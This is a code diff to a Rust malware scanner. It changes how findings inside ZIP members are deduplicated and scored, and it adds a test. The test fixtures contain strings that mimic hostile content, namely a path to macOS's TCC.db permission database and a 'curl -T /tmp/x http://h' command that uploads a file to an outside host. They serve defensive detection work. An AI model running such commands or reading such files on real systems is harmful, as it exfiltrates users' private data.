@@ -60,9 +60,9 @@ impl Listing {
 
 /// A zip's members, scored, and what could not be inspected.
 pub(crate) struct ZipInspection {
-    /// Content-rule findings, and each rule's strongest weight in any member.
+    /// Content-rule findings, and each distinct finding's strongest weight.
     findings: Listing,
-    strongest: HashMap<String, i32>,
+    strongest: HashMap<(String, String), i32>,
     /// Unsigned / hand-ad-hoc Mach-O members and the strongest weight.
     unsigned: Listing,
     unsigned_weight: i32,
@@ -85,7 +85,7 @@ fn inspect(ctx: &ScanContext, limits: &ZipLimits) -> Option<ZipInspection> {
     }
     let rules = embedded_content_ruleset();
     let mut findings = Listing::default();
-    let mut strongest: HashMap<String, i32> = HashMap::new();
+    let mut strongest: HashMap<(String, String), i32> = HashMap::new();
     let mut unsigned = Listing::default();
     let mut unsigned_weight = 0;
     let mut member_gaps = Listing::default();
@@ -113,7 +113,8 @@ fn inspect(ctx: &ScanContext, limits: &ZipLimits) -> Option<ZipInspection> {
         }
         let result = scan_context(&member, &rules);
         for signal in &result.signals {
-            let best = strongest.entry(signal.id.clone()).or_insert(signal.weight);
+            let key = (signal.id.clone(), finding_text(&signal.description));
+            let best = strongest.entry(key).or_insert(signal.weight);
             *best = (*best).max(signal.weight);
             findings.push(format!("{}: {}", m.path, signal.description));
         }
@@ -139,9 +140,26 @@ fn inspect(ctx: &ScanContext, limits: &ZipLimits) -> Option<ZipInspection> {
     })
 }
 
+/// A member finding's description with each digit run replaced by `#`, so
+/// copies differing only in measurements (entropy, byte counts) match.
+fn finding_text(description: &str) -> String {
+    let mut out = String::with_capacity(description.len());
+    let mut in_digits = false;
+    for c in description.chars() {
+        let digit = c.is_ascii_digit();
+        if !digit {
+            out.push(c);
+        } else if !in_digits {
+            out.push('#');
+        }
+        in_digits = digit;
+    }
+    out
+}
+
 /// Scores the members of a ZIP-format file with the embedded-content rules,
-/// as one signal: each rule counts once, at its strongest member, and the
-/// sum is capped (§6.2).
+/// as one signal: each distinct finding counts once, at its strongest
+/// member, and the sum is capped (§6.2).
 pub struct ZipMemberRule;
 
 impl Rule for ZipMemberRule {
@@ -337,6 +355,25 @@ mod tests {
         assert_eq!(one(std::slice::from_ref(&dropper)), 17);
         assert_eq!(one(std::slice::from_ref(&simd)), 4);
         assert_eq!(one(&[dropper, simd]), MAX_ZIP_MEMBER_WEIGHT);
+    }
+
+    #[test]
+    fn different_findings_of_one_rule_add_and_copies_count_once() {
+        let one = |specs: &[Spec]| member_signal(&ctx(plain(specs))).unwrap().weight;
+        let tcc = |name: &str| Spec::stored(name, b"x/Library/TCC/TCC.db y");
+        let upload = Spec::stored("b.txt", b"curl -T /tmp/x http://h");
+        let (a, b) = (one(&[tcc("a.txt")]), one(std::slice::from_ref(&upload)));
+        assert!(a > 0 && b > 0);
+        assert_eq!(
+            one(&[tcc("a.txt"), upload]),
+            (a + b).min(MAX_ZIP_MEMBER_WEIGHT)
+        );
+        let copies: Vec<Spec> = (0..5).map(|i| tcc(&format!("c{i}.txt"))).collect();
+        assert_eq!(one(&copies), a);
+        assert_eq!(
+            finding_text("7.9 bits over 4096 bytes"),
+            "#.# bits over # bytes"
+        );
     }
 
     #[test]
